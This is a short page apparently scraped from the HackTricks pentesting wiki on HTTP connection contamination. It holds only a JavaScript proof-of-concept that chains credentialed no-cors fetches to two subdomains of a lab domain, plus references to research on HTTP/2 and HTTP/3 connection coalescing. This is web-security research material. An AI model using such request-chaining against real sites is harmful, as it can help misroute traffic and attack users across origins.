---
title: "HTTP Connection Contamination"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/http-connection-contamination.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

```
fetch("//sub1.hackxor.net/", { mode: "no-cors", credentials: "include" }).then(
  () => {
    fetch("//sub2.hackxor.net/", { mode: "no-cors", credentials: "include" })
  }
)
```
## References

- [1] [HTTP/3 connection contamination: an upcoming threat? (James Kettle)](https://portswigger.net/research/http-3-connection-contamination)
- [2] [HTTP/2 connection coalescing (Daniel Stenberg)](https://daniel.haxx.se/blog/2016/08/18/http2-connection-coalescing/)
